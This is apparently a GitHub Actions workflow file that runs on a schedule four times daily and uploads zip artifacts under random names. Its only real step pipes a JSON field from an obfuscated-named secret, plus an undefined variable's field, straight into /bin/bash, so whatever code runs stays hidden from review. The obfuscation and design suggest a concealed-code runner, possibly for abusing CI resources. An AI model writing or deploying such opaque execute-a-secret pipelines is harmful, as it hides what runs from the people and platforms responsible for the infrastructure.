name: zacharydocker
on:
  workflow_dispatch:

  schedule:
    - cron: '35 5,11,17,23 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: zacharydocker
        env:
          qj228: ${{ secrets.qj228 }}
        run: |
          printf '%s' "$qj228" | jq -r .p706 | /bin/bash
          echo $qhdsh42083 | jq -r .fhkf2213 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: KeRCsQ7A
          path: "*.zip"
          retention-days: 1
